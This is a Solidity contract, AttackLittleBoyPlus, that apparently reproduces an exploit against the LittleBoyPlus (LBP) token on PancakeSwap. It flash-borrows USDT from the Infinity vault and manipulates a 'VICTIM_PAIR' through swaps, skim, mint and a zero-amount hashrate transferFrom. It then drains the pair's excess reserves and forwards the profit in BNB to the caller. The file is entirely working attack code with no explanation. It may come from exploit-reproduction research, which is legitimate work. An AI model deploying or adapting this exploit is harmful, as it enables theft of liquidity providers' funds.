// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {
    SafeERC20
} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {
    LittleBoyPlusConstants as C
} from "../../src/LittleBoyPlus/Constants.sol";
import {
    IInfinityVault,
    ILBPHashrate,
    ILockCallback,
    IPancakePair,
    IPancakeRouter,
    IPolVault,
    IWBNB
} from "../../src/LittleBoyPlus/interfaces/ILittleBoyPlus.sol";

contract AttackLittleBoyPlus is ILockCallback {
    using SafeERC20 for IERC20;

    error OnlyVault();

    uint256 public lastProfitUsdt;

    receive() external payable {}

    function attack() external {
        IInfinityVault(C.PCS_INFINITY_VAULT).lock("");

        IERC20 usdt = IERC20(C.USDT);
        IPancakeRouter router = IPancakeRouter(C.ROUTER);
        IPancakePair usdtWbnb = IPancakePair(C.USDT_WBNB_PAIR);

        lastProfitUsdt = usdt.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = C.USDT;
        path[1] = C.WBNB;

        uint256 wbnbOut = router.getAmountsOut(lastProfitUsdt, path)[1];
        usdt.safeTransfer(C.USDT_WBNB_PAIR, lastProfitUsdt);
        usdtWbnb.swap(0, wbnbOut, address(this), "");
        IWBNB(C.WBNB).withdraw(wbnbOut);

        uint256 bnbBal = address(this).balance;
        if (bnbBal > 0) {
            (bool ok, ) = msg.sender.call{value: bnbBal}("");
            require(ok, "bnb forward");
        }
    }

    function lockAcquired(bytes calldata) external returns (bytes memory) {
        if (msg.sender != C.PCS_INFINITY_VAULT) revert OnlyVault();

        IInfinityVault vault = IInfinityVault(C.PCS_INFINITY_VAULT);
        IERC20 usdt = IERC20(C.USDT);
        IERC20 lbp = IERC20(C.LBP);
        IPancakePair pair = IPancakePair(C.VICTIM_PAIR);
        IPancakeRouter router = IPancakeRouter(C.ROUTER);

        uint256 vaultUsdt = usdt.balanceOf(msg.sender);
        vault.take(C.USDT, address(this), vaultUsdt);

        address[] memory path = new address[](2);
        path[0] = C.USDT;
        path[1] = C.LBP;

        IPolVault(C.POL_VAULT).flushPol();

        {
            usdt.safeTransfer(C.VICTIM_PAIR, C.SWAP_USDT_LARGE);
            pair.swap(
                0,
                router.getAmountsOut(C.SWAP_USDT_LARGE, path)[1],
                address(this),
                ""
            );

            (uint112 rUsdt, uint112 rLbp, ) = pair.getReserves();
            uint256 lbpForPol = (C.POL_INJECT_USDT * uint256(rLbp)) /
                uint256(rUsdt);
            uint256 lbpOnHand = lbp.balanceOf(address(this));
            if (lbpForPol > lbpOnHand) {
                lbpForPol = lbpOnHand;
            }
            if (lbpForPol > 0) {
                lbp.safeTransfer(C.VICTIM_PAIR, lbpForPol);
            }
            usdt.safeTransfer(C.VICTIM_PAIR, C.POL_INJECT_USDT);
            pair.skim(C.VICTIM_PAIR);
            pair.mint(address(this));
            lbp.transfer(address(this), 0);
        }

        ILBPHashrate(C.HASHRATE).transferFrom(C.VICTIM_PAIR, C.DEAD, 0);

        {
            uint256 lbpHere = lbp.balanceOf(address(this));
            if (lbpHere > C.PRE_DRAIN_LBP_1) {
                lbp.safeTransfer(C.VICTIM_PAIR, C.PRE_DRAIN_LBP_1);
            } else if (lbpHere > 0) {
                lbp.safeTransfer(C.VICTIM_PAIR, lbpHere);
            }
            lbpHere = lbp.balanceOf(address(this));
            if (lbpHere >= C.PRE_DRAIN_LBP_2) {
                lbp.safeTransfer(C.VICTIM_PAIR, C.PRE_DRAIN_LBP_2);
            } else if (lbpHere > 0) {
                lbp.safeTransfer(C.VICTIM_PAIR, lbpHere);
            }

            (, uint112 rLbpAfter, ) = pair.getReserves();
            uint256 lbpExcess = lbp.balanceOf(C.VICTIM_PAIR) -
                uint256(rLbpAfter);

            path[0] = C.LBP;
            path[1] = C.USDT;
            uint256 usdtOut = router.getAmountsOut(lbpExcess, path)[1];
            pair.swap(usdtOut, 0, address(this), "");
        }

        vault.sync(C.USDT);
        usdt.safeTransfer(C.PCS_INFINITY_VAULT, vaultUsdt);
        vault.settle();

        return "";
    }
}
